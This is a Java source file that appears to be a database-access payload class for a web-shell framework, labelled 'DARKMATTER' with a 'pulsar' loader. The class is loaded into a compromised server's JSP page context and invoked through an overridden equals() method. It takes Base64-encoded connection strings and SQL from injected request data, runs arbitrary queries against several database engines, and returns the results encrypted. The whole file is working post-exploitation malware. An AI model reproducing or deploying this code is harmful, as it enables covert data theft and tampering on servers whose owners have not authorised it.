import java.io.File;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.sql.*;

public class db_query extends ClassLoader
{
    public db_query(ClassLoader objParent) { super(objParent); }
    public db_query() { super(db_query.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szSplitter = mapParams.get("splitter");
            StringBuffer sb = new StringBuffer();

            String z0 = mapParams.get("z0");
            String z1 = mapParams.get("z1");

            try
            {
                String szDsnURL = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8);
                String szSQL = z1 != null ? new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8) : "";

                sb.append(fnProcessDatabaseRequest(szDsnURL, szSQL));
            }
            catch (Exception ex)
            {
                sb.append(ex.getMessage());
            }

            String szOutput = sb.toString();
            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }

    String fnProcessDatabaseRequest(String dsnUrl, String sql) throws Exception {
        String jdbcUrl = "";
        String user = null;
        String password = null;

        String driver = dsnUrl.split("://")[0].toLowerCase();

        switch (driver) {
            case "mysql":
            case "pgsql":
            case "postgresql":
            case "oracle":
            case "sqlsrv":
                URI uri = new URI(dsnUrl);
                String host = uri.getHost();
                int port = uri.getPort();
                String database = uri.getPath() != null ? uri.getPath().replaceAll("^/", "") : "";

                if (uri.getUserInfo() != null)
                {
                    String[] userInfo = uri.getUserInfo().split(":", 2);
                    user = userInfo[0];

                    if (userInfo.length > 1)
                        password = userInfo[1];
                }

                if ("mysql".equals(driver))
                {
                    fnCheckDriverPresent("com.mysql.cj.jdbc.Driver");
                    jdbcUrl = String.format("jdbc:mysql://%s:%d/%s?useSSL=false&serverTimezone=UTC", host, port == -1 ? 3306 : port, database);
                }
                else if ("pgsql".equals(driver) || "postgresql".equals(driver))
                {
                    fnCheckDriverPresent("org.postgresql.Driver");
                    jdbcUrl = String.format("jdbc:postgresql://%s:%d/%s", host, port == -1 ? 5432 : port, database);
                }
                else if ("sqlsrv".equals(driver))
                {
                    fnCheckDriverPresent("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                    jdbcUrl = String.format("jdbc:sqlserver://%s:%d;databaseName=%s;encrypt=false;", host, port == -1 ? 1433 : port, database);
                }
                else if ("oracle".equals(driver))
                {
                    fnCheckDriverPresent("oracle.jdbc.driver.OracleDriver");
                    jdbcUrl = String.format("jdbc:oracle:thin:@//%s:%d/%s", host, port == -1 ? 1521 : port, database);
                }

                break;

            case "sqlite":
                fnCheckDriverPresent("org.sqlite.JDBC");
                String sqlitePath = dsnUrl.substring(9); // strip 'sqlite://'
                if (!new File(sqlitePath).exists()) {
                    throw new Exception("SQLite file not found: " + sqlitePath);
                }
                jdbcUrl = "jdbc:sqlite:" + sqlitePath;

                break;

            case "access":
                fnCheckDriverPresent("net.ucanaccess.jdbc.UcanaccessDriver"); // Standard Java MS Access driver library
                String accessContent = dsnUrl.substring(9); // strip 'access://'
                String[] parts = accessContent.split(";");
                String accessPath = parts[0];
                if (!new File(accessPath).exists())
                    throw new Exception("Access file not found: " + accessPath);
                
                // Parse optional password
                String accessPwd = "";
                for (String part : parts)
                {
                    if (part.toLowerCase().startsWith("password=") || part.toLowerCase().startsWith("pwd="))
                        accessPwd = part.split("=")[1];
                }

                jdbcUrl = "jdbc:ucanaccess://" + accessPath + (accessPwd.isEmpty() ? "" : ";jackcessOpener=com.healthmarketscience.jackcess.CryptCodecProvider;password=" + accessPwd);
                
                break;

            default:
                throw new Exception("Unsupported database type: " + driver);
        }

        // Connect and process statement
        try (Connection conn = DriverManager.getConnection(jdbcUrl, user, password))
        {
            if (sql.trim().isEmpty())
                return "{\"success\":true,\"message\":\"Database connection is OK\"}";

            try (Statement stmt = conn.createStatement())
            {
                boolean hasResultSet = stmt.execute(sql);

                if (hasResultSet)
                {
                    try (ResultSet rs = stmt.getResultSet())
                    {
                        ResultSetMetaData md = rs.getMetaData();
                        int columns = md.getColumnCount();
                        List<String> jsonRows = new ArrayList<>();

                        while (rs.next())
                        {
                            Map<String, Object> row = new LinkedHashMap<>();
                            for (int i = 1; i <= columns; i++)
                                row.put(md.getColumnLabel(i), rs.getObject(i));

                            jsonRows.add(fnMapToJsonObject(row));
                        }

                        return String.format("{\"success\":true,\"rowCount\":%d,\"data\":[%s]}", jsonRows.size(), String.join(",", jsonRows));
                    }
                }
                else
                {
                    int updateCount = stmt.getUpdateCount();
                    return String.format("{\"success\":true,\"rowCount\":%d,\"data\":[]}", updateCount);
                }
            }
        }
    }

    private void fnCheckDriverPresent(String className) throws Exception
    {
        try {
            Class.forName(className);
        } catch (ClassNotFoundException e) {
            throw new Exception("Missing JDBC driver dependency on classpath: " + className);
        }
    }

    private String fnMapToJsonObject(Map<String, Object> map)
    {
        List<String> pairs = new ArrayList<>();
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            String val = entry.getValue() == null ? "null" : "\"" + fnEscapeJson(entry.getValue().toString()) + "\"";
            if (entry.getValue() instanceof Number || entry.getValue() instanceof Boolean) {
                val = entry.getValue().toString();
            }
            pairs.add("\"" + fnEscapeJson(entry.getKey()) + "\":" + val);
        }
        return "{" + String.join(",", pairs) + "}";
    }

    private static String fnEscapeJson(String str)
    {
        if (str == null)
            return "";

        return str.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }
}